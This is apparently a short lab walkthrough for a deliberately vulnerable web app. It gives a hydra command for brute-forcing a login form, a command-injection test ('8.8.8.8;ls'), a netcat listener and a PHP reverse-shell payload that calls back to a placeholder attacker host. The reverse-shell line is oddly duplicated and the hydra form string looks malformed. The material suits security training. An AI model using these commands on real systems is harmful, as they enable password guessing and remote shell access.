## Brute Force the login page



MACHINE_IP/login.php
` hydra -l admin -P <path/to/file> MACHINE_IP http-post-form "/:username=^USER^&^password=PASS^:F='Login failed'" -V `


## Command Injection

##### Vulnerability Level: 

[![css progressbar](https://readme-components.vercel.app/api?component=linearprogress&skill=Low&value=25)](https://github.com/harish-sethuraman/readme-components)

1. Testing for vulnerability by listing the directories
` 8.8.8.8;ls `

2. Gaining a Reverse Shell
    - Open a netcat listener in Kali terminal
    ` nc -lnvp  `

    - Past this code in the 'Enter an IP address: ' form. Make sure to prepend an IP address for the ping command to run and the reverse shell to work.
    `8.8.8.8;php -r '$sock=fsockopen("<KaliMachineIP>",4242);exec("/bin/sh -i <&3 >&3 2>&3");' php -r '$sock=fsockopen("<kaliMACHINEIP>",4242);exec("/bin/sh -i <&3 >&3 2>&3");' `
